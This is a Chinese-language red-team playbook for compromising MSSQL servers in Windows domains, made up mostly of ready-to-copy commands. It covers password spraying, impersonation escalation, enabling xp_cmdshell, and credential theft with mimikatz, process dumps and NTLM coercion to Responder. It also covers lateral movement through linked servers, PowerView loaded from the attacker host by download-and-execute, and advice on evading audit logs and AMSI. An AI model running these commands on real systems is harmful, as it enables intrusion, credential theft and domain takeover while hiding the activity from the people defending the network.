# MSSQL 与域攻击链

内网里的 MSSQL 常用域账户跑服务、拿 sysadmin 就能落 shell,是"数据库口令 → OS 命令 → 域凭据"的标准跳板。本文流程:发现枚举(nxc/nmap)→ impacket-mssqlclient 登录 → 提权 sysadmin 与 xp_cmdshell → 服务账户域凭据提取 → 链接服务器/IMPERSONATE 横向 → 与域联动(PowerView/nltest/哈希直抓)→ OPSEC。命令均可直接复制,占位符用尖括号标注(如 `<攻击机IP>` `<域名>`);bash 块 = 攻击机 Kali,sql 块 = 在 mssqlclient 交互提示符(或 nxc `-q`)里执行的 SQL,存储过程/EXEC 语句全部写在 sql 块,不虚构。

本文件工具:nxc(netexec,mssql 协议)、nmap ms-sql-\* 脚本、impacket-mssqlclient(/usr/bin);目标机侧复用 13 号文档武器库(mimikatz、PowerView)。凭据拿到后的哈希传递/Kerberoast 见 05,Kerberos 深入见 12,本地提权见 07。

---

## 发现与枚举 — nxc mssql 端口探测、口令验证与 nmap 1433/1434 实例发现

来源:Kali apt 包 netexec(`nxc`,1.5.1,`nxc mssql --help` 实测支持本节全部参数)+ nmap 脚本(/usr/share/nmap/scripts/ms-sql-\*.nse 本机核实存在)

```bash
# ===== 端口与版本 =====
# TCP 1433 默认实例端口;ms-sql-info 无需凭据,经 SQL Browser(UDP 1434)或预登录探测报版本
nmap -p 1433 --script ms-sql-info <目标IP或网段>
# UDP 1434 = SQL Server Browser:命名实例的动态端口全靠它问出来(1433 不通时必查)
nmap -sU -p 1434 --script ms-sql-info <目标IP>
# 无需有效凭据:借 NTLM 挑战泄露域名/机器名/版本(和 smb 的域信息一个道理)
nmap -p 1433 --script ms-sql-ntlm-info <目标IP>
# 广播发现同广播域全部实例(结果进 nmap 注册表,供其他 ms-sql-* 脚本复用)
nmap -sn --script broadcast-ms-sql-discover <所在子网CIDR>
# 拿到凭据后可叠加:ms-sql-query 直接查、ms-sql-xp-cmdshell 直接执行(见提权小节)
nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password='<密码>',ms-sql-query.query="SELECT @@version" <目标IP>

# ===== nxc 验证口令(成功行 [+] ... 后跟 (WIN))=====
nxc mssql <目标IP> -u sa -p '<密码>'                # SQL 身份验证(sa 等 SQL 登录)
nxc mssql <目标IP> -u <本地管理员> -p '<密码>' --local-auth   # 强制本地验证(不吃域策略)
nxc mssql <目标IP> -u <域用户> -p '<密码>' -d <域名>          # 域账户验证(-d 显式指定域名)
nxc mssql <目标IP> -u <用户> -H <NTLM哈希>          # 哈希登录(-H,Windows 身份验证可 NTLM 传哈希)
nxc mssql <目标IP> -u <域用户> -p '<密码>' -k --kdcHost <域控FQDN>   # Kerberos 认证(-k,防日志落 DC 外主机)
# 撞库:字典对字典;--ufail-limit 每用户失败上限,防锁号(锁号=立刻暴露)
nxc mssql <目标网段CIDR> -u <用户字典文件> -p <密码字典文件> --ufail-limit 3
# 装有 MSSQL 的网段全量扫一遍(1443 是打错的下场,默认 1433;--port 可改)
nxc mssql <目标网段CIDR> -u sa -p '<密码>' --port 1433

# ===== 枚举(全部无需 sysadmin)=====
nxc mssql <目标IP> -u sa -p '<密码>' -q 'SELECT @@version'          # 执行任意 SQL
nxc mssql <目标IP> -u sa -p '<密码>' --database                     # 列全部数据库
nxc mssql <目标IP> -u sa -p '<密码>' --database <库名>              # 列指定库的表
nxc mssql <目标IP> -u sa -p '<密码>' --rid-brute                    # RID 暴力枚举域用户
nxc mssql <目标IP> -u sa -p '<密码>' -M enum_logins                 # 枚举登录(SQL/域/本地三类)
nxc mssql <目标IP> -u sa -p '<密码>' -M enum_impersonate            # 枚举可 IMPERSONATE 的登录(提权路线)
nxc mssql <目标IP> -u sa -p '<密码>' -M enum_links                  # 枚举链接服务器(横向路线)
nxc mssql <目标IP> -u sa -p '<密码>' -M mssql_priv                  # 权限体检,直接给可打的提权路径
```

参数速查:
- `nmap -sU -p 1434 --script ms-sql-info` SQL Browser 实例发现(命名实例必备);`ms-sql-ntlm-info` 无凭据泄域信息
- `--local-auth` 本地验证 / `-d <域名>` 域验证 / `-k` + `--kdcHost <域控FQDN>` Kerberos / `-H <NTLM>` 哈希
- `-q '<SQL>'` 执行查询;`--database [NAME]` 列库/列表;`--rid-brute [MAX_RID]` RID 枚举域用户
- `-M <模块>` 模块:`enum_logins` / `enum_impersonate` / `enum_links` / `mssql_priv`(`-L` 列全部,本节清单为 `-L` 实测输出)
- `--ufail-limit`/`--gfail-limit` 单用户/全局失败上限——撞库防锁号必加
- `--port <端口>` 改端口(默认 1433);`--mssql-timeout` 连接超时

注意: 1433/1434 是互联网/内网扫描器最爱扫的端口之一,撞库失败会按默认审计级别写进目标 ERRORLOG(见 OPSEC 小节),字典别乱喂;`--rid-brute`/模块每次连接都会留登录记录,时间点集中在深夜=典型撞库特征,红队作业尽量并入正常业务时段;sa 空口令/弱口令仍大量存在,先 `ms-sql-empty-password` 或 `nxc mssql <IP> -u sa -p ''` 探一遍再上字典。

---

## impacket-mssqlclient — 全功能交互式客户端(后续 SQL 操作的默认环境)

来源:apt 包 python3-impacket(/usr/bin/impacket-mssqlclient,impacket v0.14.0.dev0,`--help` 实测)

```bash
# SQL 身份验证(本地 sa 登录,最常见入口)
impacket-mssqlclient 'sa:<密码>@<目标IP>'
# Windows 身份验证(域/本地账户)必须加 -windows-auth,否则走 SQL 认证直接报错
impacket-mssqlclient '<域名>/<域用户>:<密码>@<目标IP>' -windows-auth
# 哈希登录(-hashes 格式 LM:NT,LM 留空写冒号)
impacket-mssqlclient -hashes :<NTLM哈希> '<域名>/<用户>@<目标IP>' -windows-auth
# Kerberos 认证(票据来自 KRB5CCNAME;域内打 MSSQL 防落地密码的好路子)
impacket-mssqlclient -k '<域名>/<用户>@<目标主机名>' -dc-ip <域控IP>
# 一次性执行不进交互(-command 后接 SQL);-show 回显实际语句
impacket-mssqlclient 'sa:<密码>@<目标IP>' -command 'SELECT @@version' -show
```

进入后提示符为 `SQL (sa  dbo@master)>`,直接输入 SQL 回车即执行(下一节起所有 sql 块都在这执行)。**内置快捷命令(`help` 实测,比手打 SQL 稳):**

```bash
# === 以下为 mssqlclient 交互内置命令(非 SQL,回车即用)===
help                      # 完整命令清单
enum_db                   # 枚举数据库
enum_logins               # 枚举登录(SQL/域/本地)
enum_impersonate          # 枚举可冒充登录(接提权小节)
enum_links                # 枚举链接服务器(接横向小节)
enable_xp_cmdshell        # 一键开 xp_cmdshell(自动跑 sp_configure 链,见提权小节)
disable_xp_cmdshell       # 用完还原(OPSEC)
xp_cmdshell 'whoami'      # 直接执行系统命令(免手打 EXEC xp_cmdshell '...')
xp_dirtree '\\<攻击机IP>\share'   # 让服务账户回连 UNC(抓 NetNTLM 用,见凭据小节)
exec_as_login sa          # 冒充 sa 登录(等价 EXECUTE AS LOGIN,见提权小节)
use_link <链接名>          # 切到链接服务器上下文(再打 use_link localhost 切回)
upload <本地文件> <远端路径> / download <远端文件> <本地路径>   # 免 xp_cmdshell 的文件传输
exit                      # 退出
```

参数速查:
- 目标格式 `[[域/]用户[:密码]@]<主机或IP>`;`-windows-auth` Windows 身份验证(域账户必加)
- `-hashes :<NTLM>` 哈希登录;`-k` Kerberos(ccache);`-aesKey <hex>` AES 密钥;`-dc-ip` 指定 DC
- `-port <端口>`(默认 1433)、`-db <库名>` 进库、`-target-ip` 主机名解析不了时指定 IP
- `-command '<SQL>'` 非交互执行;`-file <文件>` 批量执行;`-show` 回显语句(写报告方便)
- 交互内 `! <cmd>` 执行攻击机本地 shell 命令;`show_query`/`mask_query` 开关语句回显

注意: 大量 SQL 走交互手打容易引号翻车——`xp_cmdshell`、`enable_xp_cmdshell` 等内置命令优先,原始 EXEC 链见下一节;每条 SQL 在服务端错误日志都有记录(语法错误也记),拼错重试等于加倍留痕;批量作业用 `-file`,别把密码留在 shell history(`history -c` 或开头加空格)。

---

## 提权到 sysadmin 与 xp_cmdshell — 从普通登录到 OS 命令执行

来源:SQL Server 系统存储过程(sp_configure/sp_readerrorlog 为微软官方文档对象;enable_xp_cmdshell 为 mssqlclient 内置命令,源码核实)

```sql
-- ===== 第 0 步:认清自己是谁 =====
-- IS_SRVROLEMEMBER 返回:1=是 sysadmin,0=不是,NULL=无权查询;已经 1 就跳到 xp_cmdshell
SELECT SYSTEM_USER AS 当前登录, DB_NAME() AS 当前库, IS_SRVROLEMEMBER('sysadmin') AS 是否sysadmin;
-- 顺带看服务器角色归属(_PUBLIC 之外还有什么)
SELECT p.name AS 登录, r.name AS 角色 FROM sys.server_role_members m
JOIN sys.server_principals r ON m.role_principal_id = r.principal_id
JOIN sys.server_principals p ON m.member_principal_id = p.principal_id;

-- ===== 路线 1:IMPERSONATE 冒充提权(有 IMPERSONATE 权限即可,不必 sysadmin)=====
-- 先枚举谁能冒充谁(等价内置命令 enum_impersonate / nxc -M enum_impersonate)
SELECT b.name AS 可冒充者, c.name AS 冒充目标
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantee_principal_id = b.principal_id
JOIN sys.server_principals c ON a.major_id = c.principal_id
WHERE a.permission_name = 'IMPERSONATE';
-- 冒充 sa(或上面查到的任何 sysadmin 登录),复查角色
EXECUTE AS LOGIN = 'sa';
SELECT SUSER_SNAME() AS 现在是, IS_SRVROLEMEMBER('sysadmin') AS 是否sysadmin;
REVERT;   -- 退回原身份(每次 EXECUTE AS 后建议显式 REVERT,会话残留冒充上下文是脏尾巴)

-- ===== 路线 2:已经 sysadmin,开 xp_cmdshell =====
-- SQL Server 2005+ 默认禁用 xp_cmdshell,两条 sp_configure + RECONFIGURE 打开
-- (等价 mssqlclient 内置命令 enable_xp_cmdshell,一条搞定)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- ===== 拿 shell:第一条命令永远是看身份 =====
EXEC xp_cmdshell 'whoami';
-- 返回 NT SERVICE\MSSQLSERVER = 本地服务账户(先 Potato 提权见 07);
-- 返回 <域名>\SQL服务账户 = 域账户,直接是域立足点(下一节重点)
EXEC xp_cmdshell 'whoami /priv';   -- 看 SeImpersonatePrivilege(Potato 前提)/ SeAssignPrimaryToken

-- ===== 复位(用完还原,OPSEC)=====
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

参数速查:
- `IS_SRVROLEMEMBER('sysadmin')` 1/0/NULL 三态;换 `'db_owner'`、`'securityadmin'` 查其他角色
- `EXECUTE AS LOGIN = '<登录>'` / `REVERT` 进出冒充上下文;库内版本是 `EXECUTE AS USER`
- `sp_configure '<选项>', <0|1>` + `RECONFIGURE` 成对出现,改完必须 RECONFIGURE 才生效
- `EXEC xp_cmdshell '<命令>'` 输出为每行一记录的结果集;`@echo off` 类 cmd 语法原样可用
- 双引号规则:外层 SQL 字符串单引号,命令内引号写成两个单引号 `''` 转义

注意: EXECUTE AS 登录前必须确认目标登录存在且是 sysadmin,冒充失败也会记日志;`securityadmin`/`db_owner`+xp 残留是老提权面(mssql_priv 模块直接给结论);xp_cmdshell 每次调用都产生 sqlservr.exe → cmd.exe 进程链,Sysmon/EDR 的父子进程规则极易命中,命令保持短小、别起交互式程序;`show advanced options` 与 RECONFIGURE 的改动在企业审计(SQL Audit)下会留 DDL/配置变更事件,离场记得复位。

---

## 域凭据提取 — 服务账户票据、LSA Secrets、错误日志与 UNC 回连

来源:存储过程(xp_dirtree/sp_readerrorlog 为官方对象)+ mimikatz(~/tools/windows/mimikatz/x64/mimikatz.exe,详见 13)+ nxc(本机源码核实 --sam/--lsa 实现)

```sql
-- ===== 1. UNC 回连抓服务账户 NetNTLM(不需要任何主机权限)=====
-- 让 SQL 服务账户向攻击机发起 SMB 认证;攻击机先跑 responder 抓挑战(破解见 04)
EXEC master..xp_dirtree '\\<攻击机IP>\share';
-- 平替:EXEC master..xp_fileexist '\\<攻击机IP>\share\1.txt';nxc 侧等价模块:-M mssql_coerce
-- 服务账户是域账户时,NTLM 挑战=域账户凭据指纹;是机器账户时确认 SPN 可 Kerberoast
```

```bash
# 攻击机配合(抓到 NetNTLM hash 喂 hashcat -m 5600,见 04)
sudo impacket-Responder -I eth0 -v
```

```sql
-- ===== 2. sysadmin 读得到的:错误日志(默认审计级别=仅失败登录,全在里面)=====
-- 参数:0=当前日志文件,1=SQL Server 日志(2=Agent),第三参=过滤词
EXEC sp_readerrorlog 0, 1, 'Login failed';
-- 换过滤词挖情报:'error'、'starting' 版本与服务账户、'Audit' 审计事件
EXEC sp_readerrorlog 0, 1, 'starting';
```

拿到 xp_cmdshell 或主机管理员后的凭据提取(命令在目标机 Windows 侧,工具部署见 13):

```bat
:::: ===== 3. SQL 服务账户的明文密码藏在 LSA Secrets(域服务账户场景的主路线)=====
:::: 服务以域账户注册时,SCM 把密码存进 LSA Secrets,_SC_<服务名> 键(MSSQLSERVER 为默认实例服务名)
:::: 先经 xp_cmdshell/提权拿到 SYSTEM(07),再上 mimikatz:
C:\Temp\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
:::: 输出里找 _SC_MSSQLSERVER 段 → 服务的域账户明文密码 → 直接认证/接管 SPN
:::: 命名实例服务名形如 MSSQL$<实例名>;其他 SQL 相关服务(SQLAgent、SSIS)同理各有 _SC_ 键
```

```bat
:::: ===== 4. 服务账户票据:在 sqlservr.exe 自己进程空间,不在 lsass =====
:::: mimikatz sekurlsa 系列只解析 lsass,别拿 sqlservr.dmp 喂它;正确姿势:
:::: SYSTEM 权限转储 sqlservr.exe 后离线分析(procdump/comsvcs MiniDump 见 07/13)
procdump -accepteula -ma sqlservr.exe C:\Temp\sql.dmp
:::: sql.dmp 拖回攻击机:pypykatz/离线内存搜服务账户 TGT 或密钥;票据拿去 12 号的 pass-the-ticket
```

```bash
# ===== 5. nxc 远程版(源码核实:--sam/--lsa 均经 sysadmin 命令执行 reg save 后回传本地解析)=====
nxc mssql <目标IP> -u sa -p '<密码>' --sam    # 导出本地 SAM 哈希(reg save HKLM\SAM/SYSTEM 回传解析)
nxc mssql <目标IP> -u sa -p '<密码>' --lsa    # 导出 LSA Secrets(reg save HKLM\SECURITY 回传解析)
# --lsa 输出同样找 _SC_MSSQLSERVER:服务账户明文密码;--sam 的 RID 500 哈希喂 05 的哈希传递
```

参数速查:
- `EXEC master..xp_dirtree '\\<IP>\<共享>'` 触发服务账户 SMB 认证(无回显,纯回连)
- `EXEC sp_readerrorlog <日志号>, <1|2>, '<过滤词>'` 1=SQL/2=Agent;`EXEC xp_readerrorlog` 同参(底层 xp)
- mimikatz `lsadump::secrets` 读 `_SC_MSSQLSERVER` 服务账户明文;`lsadump::sam` 本地哈希(详见 13)
- `nxc mssql --sam` / `--lsa` 需 sysadmin(admin_privs 判定即 IS_SRVROLEMEMBER('sysadmin'))
- 服务账户 SPN 形如 `MSSQLSvc/<主机名>.<域名>:1433`,域账户跑服务即可 Kerberoast(impacket-GetUserSPNs,见 05)

注意: xp_dirtree 回连在目标是无害系统调用,但攻击机侧 responder 会把整个网段的挑战都接下来,别在共享网段乱开;`sp_readerrorlog`/`xp_readerrorlog` 是未文档化对象但全版本存在,只读不写、不留痕;LSA Secrets 的 `_SC_` 键对应服务删除即失效,离场别动服务配置;sqlservr.exe 转储文件巨大(GB 级),放系统盘易触发磁盘告警,转储后立即压缩回传删除。

---

## 链接服务器与横向 — OPENQUERY / EXECUTE AT 链式打穿多台 MSSQL

来源:sys.servers/sys.linked_logins 目录视图与 OPENQUERY/EXECUTE AT 语法(微软官方对象;mssqlclient use_link 与 nxc exec_on_link/link_xpcmd 模块选项本机源码核实)

```sql
-- ===== 枚举链接(等价内置命令 enum_links / nxc -M enum_links)=====
EXEC sp_linkedservers;
-- 看每个链接用什么身份连远端:remote_name 是远端登录名,uses_self_credential=1 表示沿用本会话身份
SELECT ss.name AS 链接名, ss.data_source AS 远端, ss.is_linked,
       sl.remote_name AS 远端登录, sl.uses_self_credential AS 沿用自身凭据
FROM sys.servers ss
LEFT JOIN sys.linked_logins sl ON ss.server_id = sl.server_id;

-- ===== 在远端执行查询:OPENQUERY(只需链接存在;查 SYSTEM_USER 看以谁的身份在远端跑)=====
SELECT * FROM OPENQUERY(<链接名>, 'SELECT SYSTEM_USER AS 远端身份, IS_SRVROLEMEMBER(''sysadmin'') AS 远端sysadmin');
-- 远端是 sysadmin → 接着把上一节的 xp_cmdshell 链塞进远端执行

-- ===== 在远端执行命令:EXECUTE (...) AT(需要链接启用 rpc out;内层单引号全部双写转义)=====
EXECUTE ('EXEC master.dbo.sp_configure ''show advanced options'',1; RECONFIGURE;
          EXEC master.dbo.sp_configure ''xp_cmdshell'',1; RECONFIGURE;
          EXEC master..xp_cmdshell ''whoami''') AT [<链接名>];

-- ===== 经中间机跳第二跳(经典链:A→B→C,A 与 C 无直连)=====
-- mssqlclient 内:use_link <B的链接名> 进入 B 上下文后,上面的 OPENQUERY/EXECUTE AT 再打 B 的链接即落在 C
-- use_link localhost 回到本机;use_link .. 退回上一跳
```

```bash
# ===== nxc 一条龙(模块选项 LINKED_SERVER/COMMAND/CMD 为本机源码核实)=====
nxc mssql <目标IP> -u sa -p '<密码>' -M enum_links                        # 枚举链接
nxc mssql <目标IP> -u sa -p '<密码>' -M exec_on_link -o LINKED_SERVER=<链接名> COMMAND='whoami'
nxc mssql <目标IP> -u sa -p '<密码>' -M link_enable_cmdshell -o LINKED_SERVER=<链接名>   # 远端开 xp_cmdshell
nxc mssql <目标IP> -u sa -p '<密码>' -M link_xpcmd -o LINKED_SERVER=<链接名> CMD='whoami'   # 远端执行命令
```

参数速查:
- `EXEC sp_linkedservers;` 快速全列;`sys.servers`+`sys.linked_logins` 看远端登录细节
- `SELECT * FROM OPENQUERY(<链接>, '<远端SQL>')` 透传查询,远端身份=链接配置的 remote_name
- `EXECUTE ('<远端SQL>') AT [<链接>]` 透传执行,需链接 rpc out;嵌套引号每层双写 `''`
- mssqlclient:`use_link <名>` / `use_link localhost` / `use_link ..`;`enum_links`
- nxc:`-M enum_links` / `-M exec_on_link -o LINKED_SERVER=<名> COMMAND=<命令>` / `-M link_xpcmd -o LINKED_SERVER=<名> CMD=<命令>` / `-M link_enable_cmdshell`

注意: 链接执行发生在远端,但**登录记录两头都留**——本机的链接调用与远端的登录审计各一条,跨机追责链完整;`EXECUTE ... AT` 的 rpc out 没开时改用 OPENQUERY(功能受限但门槛低);链接常配置 sa 对 sa,一台被打穿=整条链打穿,报告里要把全部链路列出来;双跳场景凭据不会被中转(远端用链接自己的 remote_name),所以链式 Kerberos 委派不是这里的前提,别和 unconstrained delegation 混为一谈(见 12)。

---

## 与域联动 — xp_cmdshell 下的 PowerView / nltest 与 nxc 哈希直抓

来源:Windows 自带 nltest/whoami + PowerView(~/tools/src/PowerSploit/Recon/PowerView.ps1,函数集见 13)+ nxc(-x/-X/--put-file/--get-file/--sam/--lsa 均 -h 实测)

```bash
# ===== 零落地域侦察:经 nxc -x 直接跑目标机系统自带命令(OPSEC 最优)=====
nxc mssql <目标IP> -u sa -p '<密码>' -x "nltest /dsgetdc:<域名>"          # 定位域控
nxc mssql <目标IP> -u sa -p '<密码>' -x "nltest /domain_trusts /all_trusts"   # 全部信任关系(跨域路线)
nxc mssql <目标IP> -u sa -p '<密码>' -x "whoami /all"                    # 服务账户的域组/特权全貌
nxc mssql <目标IP> -u sa -p '<密码>' -x "net user /domain"               # 域用户速览
# 服务账户是域账户且带特权组 → 它本身就是域立足点;SID 带 512/516/519 = 域管/DC/只读DC 组

# ===== PowerView 内存加载(-X 自动 base64 编码,命令行不留明文,见 13 OPSEC 节)=====
# 攻击机先起服务(与 13 相同)
cd ~/tools/src/PowerSploit && python3 -m http.server 8080
# 目标 SQL 主机上以服务账户上下文加载并查询域
nxc mssql <目标IP> -u sa -p '<密码>' -X "IEX (irm http://<攻击机IP>:8080/Recon/PowerView.ps1); Get-DomainController"
nxc mssql <目标IP> -u sa -p '<密码>' -X "IEX (irm http://<攻击机IP>:8080/Recon/PowerView.ps1); Get-DomainComputer -Properties dnshostname,operatingsystem | ConvertTo-Csv -NoTypeInformation"
# 结果落盘回传(--get-file 也要 sysadmin 的命令执行通道)
nxc mssql <目标IP> -u sa -p '<密码>' -X "IEX (irm http://<攻击机IP>:8080/Recon/PowerView.ps1); Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname | Out-File C:\Windows\Temp\spn.txt"
nxc mssql <目标IP> -u sa -p '<密码>' --get-file 'C:\Windows\Temp\spn.txt' spn.txt

# ===== 需要交互/复杂脚本时:先落盘再 Import(路径写法注意转义)=====
nxc mssql <目标IP> -u sa -p '<密码>' --put-file /home/kali/tools/src/PowerSploit/Recon/PowerView.ps1 'C:\Windows\Temp\pv.ps1'
nxc mssql <目标IP> -u sa -p '<密码>' -X "Import-Module C:\Windows\Temp\pv.ps1; Get-DomainUser -Identity <用户名> -Properties *"

# ===== 域用户枚举与哈希直抓(全部只要 MSSQL 凭据,不需主机口令)=====
nxc mssql <目标IP> -u sa -p '<密码>' --rid-brute        # RID 枚举域用户(输出直接是用户清单)
nxc mssql <目标IP> -u sa -p '<密码>' --sam              # 本地 SAM 哈希 → 05 哈希传递
nxc mssql <目标IP> -u sa -p '<密码>' --lsa              # LSA Secrets(含 _SC_MSSQLSERVER 服务账户明文)
```

参数速查:
- `-x '<cmd命令>'` / `-X '<PowerShell命令>'` 经命令执行通道跑;`--no-output` 不回收输出(盲打)
- `--put-file <本地> <远端>` / `--get-file <远端> <本地>` 文件双向(Windows 路径带反斜杠记得引号包住)
- `-X` 默认自动编码(`--no-encode` 关),绕开命令行明文审计;`--amsi-bypass <文件>` 自带 AMSI 绕过
- `--rid-brute [MAX_RID]` RID 枚举域用户;`--sam`/`--lsa` 见上一节
- `nltest /dsgetdc:<域名>` 定位 DC;`nltest /domain_trusts /all_trusts` 信任清单

注意: `-X` 的输出经 xp_cmdshell 通道回传,**单行超 8000 字符截断**——PowerView 大结果先 `Out-File` 再 `--get-file`;irm 下载执行会触发 PowerShell 4104 脚本块日志与 AMSI(对策见 13 免杀节),高危环境改 `--put-file` + 白名单程序;服务账户跑 PowerView 的 LDAP 查询在 DC 留 1644(若开了字段级审计)与该账户的失败查询,大范围枚举(全用户/全机器)集中跑一次,别反复;--lsa/--sam 拿到的哈希去向见 04/05,机器账户哈希直通 12 的 Kerberos 票据伪造。

---

## OPSEC — MSSQL 审计、登录留痕与 1433 暴露面

来源:SQL Server 官方审计体系(xp_instance_regread/sys.dm_server_audit_status 为官方对象;AuditLevel 注册表键为文档化配置)

```sql
-- ===== 落地前先摸清目标审计档位(只读,不留痕)=====
-- AuditLevel:0=关 1=仅成功 2=仅失败(默认)3=全部;3 时你的每次成功登录都在 ERRORLOG
EXEC xp_instance_regread N'HKEY_LOCAL_MACHINE', N'Software\Microsoft\MSSQLServer\MSSQLServer', N'AuditLevel';
-- 企业版 SQL Audit 对象是否启用(status_desc=STARTED 就是开着审计)
SELECT name, status_desc FROM sys.dm_server_audit_status;
-- 自己已留的痕迹自查:失败口令尝试默认全记(Login failed for user ...)
EXEC sp_readerrorlog 0, 1, 'Login failed';
-- 命名实例注册表路径换成 Software\Microsoft\Microsoft SQL Server\<实例名>\MSSQLServer
```

```bash
# ===== 收尾自查与暴露面报告 =====
# 登场先看撞库是否已把账号打进锁定(锁定=目标已警觉,换个思路别硬试)
nxc mssql <目标IP> -u <用户> -p '<错误密码>' --ufail-limit 1   # 谨慎:这本身也留一条失败
# 报告必写项:改过的配置(sp_configure 两项)、开的链接、留的登录记录时间窗
nxc mssql <目标IP> -u sa -p '<密码>' -q "SELECT name, data_source FROM sys.servers WHERE is_linked = 1"
```

参数速查:
- `xp_instance_regread N'HKEY_LOCAL_MACHINE', N'Software\Microsoft\MSSQLServer\MSSQLServer', N'AuditLevel'` 读审计级别(0/1/2/3)
- `sys.dm_server_audit_status` SQL Audit 运行状态;`sp_readerrorlog <号>, 1, '<词>'` 复盘 ERRORLOG
- SQL 身份验证不走 Windows 4624,成败只进 ERRORLOG;Windows 身份验证留 4624(类型 3)
- xp_cmdshell 每次调用:sqlservr.exe → cmd.exe 进程链(装 Sysmon 时 4688+父子进程规则高概率命中)
- 1433 TCP + 1434/UDP 是全网上最常被扫的组合,公网暴露的 MSSQL 视为已失陷资产

注意: 默认审计级别(仅失败)意味着**成功登录不留 ERRORLOG 记录**——手里的有效凭据尽量一次连够要的信息,失败的尝试才是主要暴露源;SQL Audit(企业版)开启时 sp_configure/xp_cmdshell 调用全程留痕,此时别动配置、改走链接服务器或 IMPERSONATE;离场清单:复位 xp_cmdshell 与 show advanced options、删除上传文件、`--get-file` 的临时产物、确认没改链接配置;改 AuditLevel/删 ERRORLOG 本身就是重大告警事件,千万别"清理"——红队原则是少留而非删(同 13);公网 1433 暴露面属于客户资产治理问题,报告单列。
